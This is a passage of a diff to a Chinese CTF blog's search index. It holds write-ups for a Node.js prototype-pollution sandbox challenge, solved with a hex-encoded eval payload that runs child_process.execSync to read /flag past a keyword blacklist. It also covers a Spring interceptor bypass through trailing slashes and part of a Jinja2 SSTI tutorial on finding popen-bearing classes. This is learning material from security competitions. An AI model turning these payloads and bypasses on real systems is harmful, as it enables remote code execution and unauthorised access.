&amp;&amp; key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">                merge(target[key], source[key]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                target[key] = source[key];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"proto"</span>, <span class="string">"constructor"</span>, <span class="string">"this"</span>, <span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> trigger = data.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterBody</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line">    <span class="keyword">if</span>(blacklist(s))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sandbox = getSandbox(req);</span><br><span class="line">    res.json(lastlogs[sandbox]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/sandbox'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sandbox = getSandbox(req);</span><br><span class="line">    res.end(sandbox);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sandbox = getSandbox(req);</span><br><span class="line">        <span class="keyword">var</span> code = req.body.code;</span><br><span class="line">        <span class="keyword">if</span>(code.hasOwnProperty(sandbox) &amp;&amp; !filterBody(code[sandbox]))&#123;</span><br><span class="line">            res.end(<span class="string">'forbidden'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(sandbox <span class="keyword">in</span> code)&#123;</span><br><span class="line">                <span class="keyword">var</span> log = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">                merge(log, code);</span><br><span class="line">                lastlogs[sandbox] = log;</span><br><span class="line">                <span class="keyword">const</span> result = vm.runInNewContext(code[sandbox]);</span><br><span class="line">                res.end(result);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.end(sandbox);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        next(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Some thing broke!'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8085</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>u1s1我不会这个题，nodejs没学过而且js都学过-。-但是总要猜一猜，看到了有几个请求的点</p>
+<blockquote>
+<p>/sandbox         这里会得到一字符串</p>
+<p>/calc                  Post要检测一些东西，需要一个code。这个code应该上面/sandbox获取到的那个字符串</p>
+</blockquote>
+<p>直接贴下payload，code后面的值为请求sandbox获取到的，给自己挖个坑，后面学了nodejs再回来看。这里关于merge可以参考</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&#123;"code":&#123;"51c7a554387b730e74dba747088ed0db":"eval(<span class="symbol">\"</span><span class="symbol">\\</span>x63<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x73<span class="symbol">\\</span>x74<span class="symbol">\\</span>x20<span class="symbol">\\</span>x70<span class="symbol">\\</span>x72<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x63<span class="symbol">\\</span>x65<span class="symbol">\\</span>x73<span class="symbol">\\</span>x73<span class="symbol">\\</span>x20<span class="symbol">\\</span>x3D<span class="symbol">\\</span>x20<span class="symbol">\\</span>x74<span class="symbol">\\</span>x68<span class="symbol">\\</span>x69<span class="symbol">\\</span>x73<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x63<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x73<span class="symbol">\\</span>x74<span class="symbol">\\</span>x72<span class="symbol">\\</span>x75<span class="symbol">\\</span>x63<span class="symbol">\\</span>x74<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x72<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x63<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x73<span class="symbol">\\</span>x74<span class="symbol">\\</span>x72<span class="symbol">\\</span>x75<span class="symbol">\\</span>x63<span class="symbol">\\</span>x74<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x72<span class="symbol">\\</span>x28<span class="symbol">\\</span>x27<span class="symbol">\\</span>x72<span class="symbol">\\</span>x65<span class="symbol">\\</span>x74<span class="symbol">\\</span>x75<span class="symbol">\\</span>x72<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x20<span class="symbol">\\</span>x74<span class="symbol">\\</span>x68<span class="symbol">\\</span>x69<span class="symbol">\\</span>x73<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x70<span class="symbol">\\</span>x72<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x63<span class="symbol">\\</span>x65<span class="symbol">\\</span>x73<span class="symbol">\\</span>x73<span class="symbol">\\</span>x27<span class="symbol">\\</span>x29<span class="symbol">\\</span>x28<span class="symbol">\\</span>x29<span class="symbol">\\</span>x3B<span class="symbol">\\</span>x70<span class="symbol">\\</span>x72<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x63<span class="symbol">\\</span>x65<span class="symbol">\\</span>x73<span class="symbol">\\</span>x73<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x6D<span class="symbol">\\</span>x61<span class="symbol">\\</span>x69<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x4D<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x64<span class="symbol">\\</span>x75<span class="symbol">\\</span>x6C<span class="symbol">\\</span>x65<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x72<span class="symbol">\\</span>x65<span class="symbol">\\</span>x71<span class="symbol">\\</span>x75<span class="symbol">\\</span>x69<span class="symbol">\\</span>x72<span class="symbol">\\</span>x65<span class="symbol">\\</span>x28<span class="symbol">\\</span>x27<span class="symbol">\\</span>x63<span class="symbol">\\</span>x68<span class="symbol">\\</span>x69<span class="symbol">\\</span>x6C<span class="symbol">\\</span>x64<span class="symbol">\\</span>x5F<span class="symbol">\\</span>x70<span class="symbol">\\</span>x72<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x63<span class="symbol">\\</span>x65<span class="symbol">\\</span>x73<span class="symbol">\\</span>x73<span class="symbol">\\</span>x27<span class="symbol">\\</span>x29<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x65<span class="symbol">\\</span>x78<span class="symbol">\\</span>x65<span class="symbol">\\</span>x63<span class="symbol">\\</span>x53<span class="symbol">\\</span>x79<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x63<span class="symbol">\\</span>x28<span class="symbol">\\</span>x27<span class="symbol">\\</span>x63<span class="symbol">\\</span>x61<span class="symbol">\\</span>x74<span class="symbol">\\</span>x20<span class="symbol">\\</span>x2F<span class="symbol">\\</span>x66<span class="symbol">\\</span>x6C<span class="symbol">\\</span>x61<span class="symbol">\\</span>x67<span class="symbol">\\</span>x27<span class="symbol">\\</span>x29<span class="symbol">\\</span>x2E<span class="symbol">\\</span>x74<span class="symbol">\\</span>x6F<span class="symbol">\\</span>x53<span class="symbol">\\</span>x74<span class="symbol">\\</span>x72<span class="symbol">\\</span>x69<span class="symbol">\\</span>x6E<span class="symbol">\\</span>x67<span class="symbol">\\</span>x28<span class="symbol">\\</span>x29<span class="symbol">\"</span>)"&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-WEB/0x01_2.png" alt="0x01_2.png"></p>
+<h4 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h4><p>好像是非预期的解法？关键代码如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">public void add<span class="constructor">Interceptors(InterceptorRegistry <span class="params">registry</span>)</span> &#123;</span><br><span class="line">       registry.add<span class="constructor">Interceptor(<span class="params">new</span> HandlerInterceptorAdapter()</span> &#123;</span><br><span class="line">           public boolean pre<span class="constructor">Handle(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>, Object <span class="params">handler</span>)</span> throws Exception &#123;</span><br><span class="line">               String uri = request.get<span class="constructor">RequestURI()</span>;</span><br><span class="line">               <span class="built_in">int</span> result = uri.index<span class="constructor">Of(<span class="string">"static/"</span>)</span>;</span><br><span class="line">               <span class="keyword">if</span> (result != -<span class="number">1</span>) &#123;</span><br><span class="line">                   return <span class="literal">true</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   uri = uri.substring(uri.last<span class="constructor">IndexOf(<span class="string">"/"</span>)</span> + <span class="number">1</span>);</span><br><span class="line">                   <span class="keyword">if</span> (!uri.equals(<span class="string">"login"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"register"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"reset"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"checkLogin"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"registerUser"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"resetUser"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"forgetpassword"</span>)<span class="operator"> &amp;&amp; </span>!uri.equals(<span class="string">"changePasswd"</span>)) &#123;</span><br><span class="line">                       User user;</span><br><span class="line">                       <span class="keyword">if</span> (uri.equals(<span class="string">"admin"</span>)<span class="operator"> &amp;&amp; </span>request.get<span class="constructor">Session()</span>.get<span class="constructor">Attribute(<span class="string">"user"</span>)</span> != null) &#123;</span><br><span class="line">                           user = (User)request.get<span class="constructor">Session()</span>.get<span class="constructor">Attribute(<span class="string">"user"</span>)</span>;</span><br><span class="line">                           <span class="keyword">if</span> (!user.get<span class="constructor">Username()</span>.equals(<span class="string">"admin"</span>)) &#123;</span><br><span class="line">                               response.send<span class="constructor">Redirect(<span class="params">request</span>.<span class="params">getContextPath</span>()</span> + <span class="string">"/main/login"</span>);</span><br><span class="line">                               return <span class="literal">false</span>;</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               return <span class="literal">true</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (uri.equals(<span class="string">"getFlag"</span>)<span class="operator"> &amp;&amp; </span>request.get<span class="constructor">Session()</span>.get<span class="constructor">Attribute(<span class="string">"user"</span>)</span> != null) &#123;</span><br><span class="line">                           user = (User)request.get<span class="constructor">Session()</span>.get<span class="constructor">Attribute(<span class="string">"user"</span>)</span>;</span><br><span class="line">                           <span class="keyword">if</span> (!user.get<span class="constructor">Username()</span>.equals(<span class="string">"admin"</span>)) &#123;</span><br><span class="line">                               response.send<span class="constructor">Redirect(<span class="params">request</span>.<span class="params">getContextPath</span>()</span> + <span class="string">"/main/login"</span>);</span><br><span class="line">                               return <span class="literal">false</span>;</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               return <span class="literal">true</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (request.get<span class="constructor">Session()</span>.get<span class="constructor">Attribute(<span class="string">"user"</span>)</span> != null) &#123;</span><br><span class="line">                           return <span class="literal">true</span>;</span><br><span class="line">                       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           response.send<span class="constructor">Redirect(<span class="params">request</span>.<span class="params">getContextPath</span>()</span> + <span class="string">"/main/login"</span>);</span><br><span class="line">                           return <span class="literal">false</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       return <span class="literal">true</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="string">"dev"</span>.equals(this.env)) &#123;</span><br><span class="line">           registry.add<span class="constructor">Interceptor(<span class="params">new</span> HandlerInterceptorAdapter()</span> &#123;</span><br><span class="line">               public boolean pre<span class="constructor">Handle(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>, Object <span class="params">handler</span>)</span> throws Exception &#123;</span><br><span class="line">                   boolean pass = <span class="module-access"><span class="module"><span class="identifier">WebMvcConfigurer</span>.</span></span>this.validate<span class="constructor">Sign(<span class="params">request</span>)</span>;</span><br><span class="line">                   <span class="keyword">if</span> (pass) &#123;</span><br><span class="line">                       return <span class="literal">true</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="module-access"><span class="module"><span class="identifier">WebMvcConfigurer</span>.</span></span>this.logger.warn(<span class="string">"签名认证失败，请求接口：&#123;&#125;，请求IP：&#123;&#125;，请求参数：&#123;&#125;"</span>, <span class="keyword">new</span> Object<span class="literal">[]</span>&#123;request.get<span class="constructor">RequestURI()</span>, <span class="module-access"><span class="module"><span class="identifier">WebMvcConfigurer</span>.</span></span>this.get<span class="constructor">IpAddress(<span class="params">request</span>)</span>, <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">request</span>.<span class="params">getParameterMap</span>()</span>)&#125;);</span><br><span class="line">                       Result result = <span class="keyword">new</span> <span class="constructor">Result()</span>;</span><br><span class="line">                       result.set<span class="constructor">Code(ResultCode.UNAUTHORIZED)</span>.set<span class="constructor">Message(<span class="string">"签名认证失败"</span>)</span>;</span><br><span class="line">                       <span class="module-access"><span class="module"><span class="identifier">WebMvcConfigurer</span>.</span></span>this.response<span class="constructor">Result(<span class="params">response</span>, <span class="params">result</span>)</span>;</span><br><span class="line">                       return <span class="literal">false</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>拦截器中拦截了admin跟getFlag，但是没有拦截admin/跟getFlag/，先post访问getFlag/把flag保存在session中，再访问admin/就获取到flag了</p>
+<p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-WEB/0x01_3.png" alt="0x01_3.png"></p>
+<p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-WEB/0x01_4.png" alt="0x01_4.png"></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -408,135 +572,6 @@
 <p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/exp.png" alt="1590734801498"></p>
 <p>最后成功接收到flag</p>
 <p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/flag.png" alt="1590734861991"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI学习</title>
-    <url>/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近在刷攻防世界的web题，遇到了好多个ssti的题，flask，Tornado等等，但是自己也没有好好总结过，只有之前CISCN的时候做某个题的时候大概弄懂了原理，也没有总结出payload总结等等，所以经过多个题的洗礼，来进行思考总结。</p>
-<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>STTI就是服务器端模板注入(Server-Side Template Injection)，与sql注入，命令注入等等原理都差不多，都是执行了外部输入的代码，即将用户输入的数据，当作代码来执行了，成为了程序中的一部分。在Flask,Django以及Tornado中，都是MVT模式的三层架构，T就是指Template(模板技术)，Flask中常用的模板是jinja2， 模板中可以访问一些 Python 内置变量，jinja2中有三种语法：</p>
-<blockquote>
-<p>控制结构 &#123;% %&#125;</p>
-<p>变量取值 &#123;&#123; &#125;&#125;</p>
-<p>注释 &#123;#   #&#125;</p>
-</blockquote>
-<p>jinja2中使用&#123;&#123; &#125;&#125;语法来表示一个变量，当利用jinja2进行渲染的时候就会执行，jinja2也支持Python中的所有数据类型，例如基本数据类型，列表，字典，对象等。</p>
-<p>使用以下代码来进行简单测试(使用的环境是python3.7)：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">  <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test/&lt;path:str&gt;') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> flask.render_template_string(str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-<p>启动后访问 <a href="http://127.0.0.1/test/&#123;&#123;1+1&#125;&#125;可以发现页面显示了一个2，即&#123;&#123;1+1&#125;&#125;中的代码进行了执行。" target="_blank" rel="noopener">http://127.0.0.1/test/&#123;&#123;1+1&#125;&#125;可以发现页面显示了一个2，即&#123;&#123;1+1&#125;&#125;中的代码进行了执行。</a><br>这段代码是一个典型的SSTI漏洞示例，漏洞成因在于：<code>render_template_string</code>函数在渲染模板的时候直接把输入的字符串进行了返回渲染，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#123;&#123; &#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123; &#125;&#125;包裹的内容当做变量解析替换。此时&#123;&#123;1+1&#125;&#125;会被解析成2。(我想起了jsp中使用el表达式也是这种差不多的语法，是否也能进行模板注入？)</p>
-<h3 id="0x02-扩展深入"><a href="#0x02-扩展深入" class="headerlink" title="0x02 扩展深入"></a>0x02 扩展深入</h3><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们在启用一个python解释器的时候，没有进行任何导包/创建变量/创建函数等等操作，还是有很多函数可以使用，这些函数叫做内建函数，这些函数在python解释器启动的时候就自动加载到内存中供我们使用。<br>这里需要提到一个命名空间的东西，这个在其他编程语言中也有相关的东西。</p>
-<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>官方文档的一段话： </p>
-<blockquote>
-<p> <em>A namespace is a mapping from names to objects.Most namespaces are currently implemented as Python dictionaries。</em> </p>
-</blockquote>
-<p>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的。命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</p>
-<p>一般有三种命名空间：   </p>
-<blockquote>
-<p><strong>内置名称（built-in names</strong>）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。<br><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。<br><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p>
-</blockquote>
-<h4 id="命名空间的”顺序”"><a href="#命名空间的”顺序”" class="headerlink" title="命名空间的”顺序”"></a>命名空间的”顺序”</h4><p><strong>查找顺序：</strong></p>
-<p>比如说我们要使用一个变量 test，则 Python 的查找顺序为：</p>
-<blockquote>
-<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
-</blockquote>
-<p>如果找不到变量 runoob，它将放弃查找并引发一个 NameError 异常:</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E9%A1%BA%E5%BA%8F_test.png" alt="0x02_命名空间的顺序_test.png"></p>
-<p><strong>加载顺序：</strong></p>
-<p>这个想都不用想，开始说了python解释器启动时就会加载内置函数，那么加载顺序肯定是内置命名空间最先加载，跟查找顺序恰恰相反。</p>
-<blockquote>
-<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
-</blockquote>
-<p>我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的<strong>builtins</strong>模块提供内建名称空间到内建对象的映射。</p>
-<p>dir()函数用于查看一个对象的属性有哪些，在没有提供参数的时候，会将返回当前环境导入的所有模块进行返回，我们可以看初始模块有哪些</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir.png" alt="0x02_dir.png"></p>
-<p>可以看到<strong>builtins</strong>是作为一个默认初始模块出现的，那么可以使用dir()查看<strong>builtins</strong>模块下的属性。</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir(__builtins__).png" alt="0x02_dir(__builtins__).png"></p>
-<p>在这个里面我们可以看到很多熟悉的关键字，len，hash，hex，input等等，这也是解释了为什么我们不需要导入这些包就能使用这些函数，因为就是通过默认模块导入了。</p>
-<p>当然我们也能自己手动再导入，再调用其中的方法，如：</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_import_builtins.png" alt="0x02_import_builtins.png"></p>
-<p>注：python3中__builtins__是引用的builtins模块，而python2中__builtins__是引用的__builtin__，所以python2中应该是<code>import __builtin__</code></p>
-<h4 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h4><p>说到类继承就想到了js中的原型链污染，都是一个继承链来的。</p>
-<p>python中对一个变量可以通过一些继承的方法，找到继承链，通常要用到以下方法</p>
-<blockquote>
-<p><strong>__class__</strong>： 万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code></p>
-<p><strong>__base__</strong> ：对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法。</p>
-<p><strong>__base__</strong> ：以元组的形式返回一个类所直接继承的类。 </p>
-<p><strong>__mro__</strong> ：同样可以获取对象的基类，只是这时会显示出整个继承链的关系(继承树)，是一个列表，object在最底层，即在列表中的最后，通过<strong>__mro__[-1]</strong>可以获取到。</p>
-<p><strong>__subclasses__()</strong> ：继承此对象的子类，返回一个列表。</p>
-<p> <strong>__init__</strong>：所有自带类都包含__init__方法。 </p>
-</blockquote>
-<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到各种“危险”类，然后调用类中的危险方法进行命令执行。</p>
-<h4 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h4><p>这里介绍几个常见的函数，有助于后续的理解</p>
-<blockquote>
-<p><strong>__dict__：</strong>类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__ 属性中的。每个类有自己的<strong>__dict__</strong>属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__ 对象也有自己的__dict__ 属性</p>
-<p><strong>__globals__：</strong>function.__globals__该属性是函数特有的属性，用于获取function所处空间下可使用的模块、方法以及所有变量。记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用__globals__属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p>
-<p><strong>__getattribute__()：</strong>实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<code>.</code>操作的时候（形如：<code>a.xxx/a.xxx()</code>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</p>
-</blockquote>
-<h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h3><p>利用上面讲到的类继承的思想，可以总结出一个利用流程：</p>
-<blockquote>
-<p>从一个变量开始-&gt;获得对象-&gt;获得基类-&gt;获得子类-&gt;遍历子类-&gt;子类中寻找可以利用的类</p>
-</blockquote>
-<p>或者说：</p>
-<blockquote>
-<p>任意找一个内置类对象，通过__class__获取到它对应的类</p>
-<p>通过__base__获取到基类<code>&lt;class &#39;object&#39;&gt;</code></p>
-<p>通过__subclasses__()获取到基类的所有子类</p>
-<p>在子类中寻找可以利用的类</p>
-<p>例如：””.__class__.__base__.__subclasses__()   ——python3</p>
-</blockquote>
-<h4 id="寻找可以利用的类"><a href="#寻找可以利用的类" class="headerlink" title="寻找可以利用的类"></a>寻找可以利用的类</h4><p>例如我们要寻找可以使用popen的类</p>
-<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#Anaconda自带的python3.7.3</span></span><br><span class="line">aim = <span class="string">"popen"</span></span><br><span class="line">order = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> <span class="string">""</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>():</span><br><span class="line">    order+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> aim <span class="built_in">in</span> i.<span class="variable">__init__</span>.<span class="variable">__globals__</span>.keys():</span><br><span class="line">            print(i,order)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_find_popen.png" alt="0x03_find_popen.png"></p>
-<p>然后就可以进行命令执行：</p>
